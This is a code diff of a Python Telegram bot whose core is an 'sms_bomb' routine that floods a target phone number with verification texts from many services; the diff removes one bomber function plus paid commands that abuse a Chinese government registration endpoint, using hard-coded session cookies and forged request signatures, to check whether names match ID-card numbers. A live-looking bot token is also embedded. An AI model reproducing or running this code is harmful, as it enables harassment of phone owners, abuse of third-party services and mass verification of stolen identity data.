@@ -6,15 +6,10 @@ import aiohttp
 import telebot
 import os
 import json
-import requests
 import time
 import ddddocr
-import hashlib
-import uuid as uuid_module
-import urllib.parse
 from PIL import Image
 from io import BytesIO
-from tempfile import NamedTemporaryFile
 
 API_TOKEN = "7418093343:AAHtR8qcmeEqknS0AeBYxmXv92CLsj6l4hw"
 bot = telebot.TeleBot(API_TOKEN)
@@ -161,7 +156,6 @@ async def sms_bomb(phone_number):
         hz14(phone_number),
         hz15(phone_number),
         hz16(phone_number),
-        hz17(phone_number),
     ]
     await asyncio.gather(*tasks)
 
@@ -212,103 +206,6 @@ def handle_hz_command(message):
 
 
 
-# 处理 /2ys 命令
-@bot.message_handler(commands=['2ys'])
-def handle_2ys_command(message):
-    user_id = message.from_user.id
-    points = load_points()
-    if str(user_id) not in points:
-        initialize_user(user_id)  # 初始化用户数据
-    else:
-        user_data = points[str(user_id)]
-        if user_data.get("current_points", 0) < 15:  # 从字典中获取积分并进行比较
-            bot.send_message(message.chat.id, "积分不足，无法进行二要素核验。")
-            return
-
-    bot.send_message(message.chat.id, "请输入姓名和身份证号（格式：姓名 身份证号）：")
-    user_state[message.from_user.id] = '2ys_input'
-
-# 处理二要素核验输入
-@bot.message_handler(content_types=['text'], func=lambda message: user_state.get(message.from_user.id) == '2ys_input')
-def handle_2ys_input(message):
-    try:
-        user_id = message.from_user.id
-        name, id_card = message.text.split()
-        result = main(name, id_card)
-        bot.reply_to(message, f"核验结果：{result}")
-        deduct_points(user_id, 15)  # 扣除积分并更新用户数据
-    except ValueError:
-        bot.reply_to(message, "输入格式错误，请按正确格式输入：姓名 身份证号")
-    except Exception as e:
-        bot.reply_to(message, f"核验失败：{str(e)}")
-    finally:
-        if user_id in user_state:
-            del user_state[user_id]
-
-
-# 处理 /yspl 命令
-@bot.message_handler(commands=['yspl'])
-def handle_yspl_command(message):
-    user_id = message.from_user.id
-    points = load_points()
-    initialize_user(user_id)  # 确保用户数据初始化
-    user_data = points.get(str(user_id), {"current_points": 0})  # 使用 get 方法安全地获取用户数据
-
-    if user_data["current_points"] < 45:
-        bot.send_message(message.chat.id, "积分不足，无法进行批量核验。")
-        return
-
-    bot.send_message(message.chat.id, "请上传包含身份信息的txt文件（每行一个姓名和身份证号）：")
-    user_state[message.from_user.id] = 'yspl_file'
-
-
-@bot.message_handler(content_types=['document'], func=lambda message: user_state.get(message.from_user.id) == 'yspl_file')
-def handle_batch_check_file(message):
-    try:
-        user_id = message.from_user.id
-        file_info = bot.get_file(message.document.file_id)
-        file_path = file_info.file_path
-        file_url = f"https://api.telegram.org/file/bot{API_TOKEN}/{file_path}"
-        response = requests.get(file_url)
-        response.raise_for_status()
-        file_content = response.content.decode('gbk', errors='replace')
-        lines = file_content.strip().split("\n")
-        results = {"成功": [], "失败": []}
-
-        for line in lines:
-            info_list = line.split()
-            if len(info_list) == 2:
-                name, id_card = info_list
-                hycodecc2 = main(name, id_card)
-                if "校验成功" in hycodecc2:
-                    results["成功"].append(f"{name} {id_card}: {hycodecc2}")
-                else:
-                    results["失败"].append(f"{name} {id_card}: {hycodecc2}")
-            else:
-                results["失败"].append(f"格式错误: {line}")
-
-        with NamedTemporaryFile(delete=False, mode='w', suffix='.txt', encoding='utf-8') as temp_file:
-            temp_file.write("核验结果\n")
-            temp_file.write("------------\n")
-            temp_file.write("成功:\n")
-            temp_file.write("\n".join(results["成功"]))
-            temp_file.write("\n\n失败:\n")
-            temp_file.write("\n".join(results["失败"]))
-            temp_file_path = temp_file.name
-
-        with open(temp_file_path, 'rb') as file:
-            bot.send_document(message.chat.id, file, caption="核验结果文件")
-
-        os.remove(temp_file_path)
-        deduct_points(user_id, 45)  # 扣除积分并更新用户数据
-
-    except requests.exceptions.RequestException as e:
-        bot.reply_to(message, f"下载文件时出错：{str(e)}。请检查文件链接的合法性，并适当重试。")
-    except Exception as e:
-        bot.reply_to(message, f"处理文件时出错：{str(e)}。")
-    finally:
-        if user_id in user_state:
-            del user_state[user_id]
 
 #-----------------------------------------------------------------------------------------------------------------------------
 
@@ -992,32 +889,7 @@ async def hz16(phone_number):
             result = await response.text()
             print('hz16', result)
 
-async def hz17(phone_number):
-    url = 'https://member-purchase.hbxinfadi.com/api/open/member/sms'
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'zh-CN,zh;q=0.9',
-        'App-Version': '2.2.4',
-        'Authorization': '111',  # 替换为有效的授权令牌
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Referer': 'https://servicewechat.com/wx5e1817bd2ac2f220/132/page-frame.html',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'cross-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) XWEB/8555',
-        'xweb_xhr': '1',
-    }
 
-    json_data = {
-        'mobile': phone_number,
-        'tdc_id': 81,
-    }
-
-    async with aiohttp.ClientSession() as session:
-        async with session.post(url, headers=headers, json=json_data) as response:
-            result = await response.json()  # 直接解析为 JSON
-            print(result)
 
 #-----------------------------------------------------------------------------------------------------------------------------
 
@@ -1031,106 +903,6 @@ async def hz17(phone_number):
 
 
 #-----------------------------------------------------------------------------------------------------------------------------
-
-def sm3_encrypt(data):
-    msg_data = data.encode('utf-8')
-    sm3_hash = hashlib.new('sm3', msg_data).hexdigest()
-    return sm3_hash.upper()
-def i(t):
-    return urllib.parse.quote(t).replace("'", "%27").replace("!", "%21").replace("~", "%7E").replace("(", "%28").replace(")", "%29")
-def generate_uuid():
-    return str(uuid_module.uuid4())
-def kkey(name, sfz):
-    if not all([name, sfz]):
-        raise ValueError("所有输入不能为空")
-
-    # 验证身份证号格式
-    if len(sfz) != 18 or not sfz[:-1].isdigit() or not sfz[-1].isalnum():
-        raise ValueError("无效的身份证号")
-
-    l = '[{"id":"_common_hidden_viewdata","type":"hidden","value":{"pageUrl":"f537e54292b4a8629af13c01a5c7834aac203632e75b1a92a4425904942727f497170de81510129fa795cfc172873b04"}}]'
-    e = f'{{"cardtype":"01","displayname":"{name}","englishname":"","cardnum":"{sfz}","country":"","txznum":"","cardstartdate":"2024-01-01T00:00:00","cardenddate":"2034-01-11T00:00:00","idcard-year":"01","sex":"女","loginid":"{sfz}","mobile":"18366761008","userreallvl":"RC03","vcode":"121211","password":"11112222qQ","passwordqr":"11112222qQ"}}'
-
-    o = generate_uuid()
-    rr = int(time.time() * 1000)
-    param_sign = sm3_encrypt(f"{o};{rr};isCommondto%3Dtrue")
-    dto_sign = sm3_encrypt(f"{o};{rr};{i(l)};{i(e)}")
-
-    headerscs = {
-        'paramSign': param_sign,
-        'dtoSign': dto_sign,
-        'uuid': o,
-        'timestamp': str(rr),
-        'cs1': l,
-        'cs2': e
-    }
-
-    return headerscs
-def main(name, sfz):
-    try:
-        BASE_URL = 'https://zwfwzjb.mohurd.gov.cn/zjb-tysf-qy/rest/registerbyguobanaction/smAuthP'
-        PARAMS = {'isCommondto': 'true'}
-        # 敏感信息从环境变量中读取
-        COOKIES = {
-            '_CSRFCOOKIE': 'C79D7E86A32271168CF4CB02FA2848B8087167E6',
-            'EPTOKEN': 'C79D7E86A32271168CF4CB02FA2848B8087167E6',
-            '_font_size_ratio_': '1.0',
-            'sid': '54EDA50319CE42F998D8EA7C4F42E707',
-            'https_waf_cookie': '224a9e0d-058a-45d574f03c4991d7bb9815cb384b597aaed9',
-        }
-
-        HEADERS = {
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'EPTOKEN': 'C79D7E86A32271168CF4CB02FA2848B8087167E6',
-            'Origin': 'https://zwfwzjb.mohurd.gov.cn',
-            'Pragma': 'no-cache',
-            'Referer': 'https://zwfwzjb.mohurd.gov.cn/zjb-tysf-qy/zjyhtx/memlogin/personal_registered.html',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
-            'User-Token': 'userSign=,reqTime=1739860083283,deviceId=67cfb5951ad128125245ed3cede8ec2f,title=%E4%B8%AA%E4%BA%BA%E6%B3%A8%E5%86%8C',
-            'X-Requested-With': 'XMLHttpRequest',
-            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            # 'Cookie': '_CSRFCOOKIE=C79D7E86A32271168CF4CB02FA2848B8087167E6; EPTOKEN=C79D7E86A32271168CF4CB02FA2848B8087167E6; _font_size_ratio_=1.0; sid=54EDA50319CE42F998D8EA7C4F42E707; https_waf_cookie=224a9e0d-058a-45d574f03c4991d7bb9815cb384b597aaed9',
-        }
-        headerscs = kkey(name, sfz)
-        data = {
-            'commonDto': headerscs['cs1'],
-            'cmdParams': headerscs['cs2'],
-            'replaynoticeid': headerscs['uuid'],
-            'reqtime': headerscs['timestamp'],
-            'paramsign': headerscs['paramSign'],
-            'dtosign': headerscs['dtoSign'],
-        }
-
-        response = requests.post(
-            BASE_URL,
-            params=PARAMS,
-            cookies=COOKIES,
-            headers=HEADERS,
-            data=data,
-            timeout=10
-        ).json()
-
-        status_code = response.get('custom', {}).get('msg')
-        if status_code == '身份证有效期校验失败,请检查信息填写是否有误！':
-            hycode = f'身份证信息校验成功{name}---{sfz}'
-        else:
-            hycode = f'身份证信息校验失败{name}---{sfz}'
-        return hycode
-
-    except requests.RequestException as e:
-            hycode = f"请求失败: {e} {name}---{sfz}"
-    except Exception as e:
-            hycode = f"发生错误: {e} {name}---{sfz}"
-    return hycode
 
 
 #-----------------------------------------------------------------------------------------------------------------------------
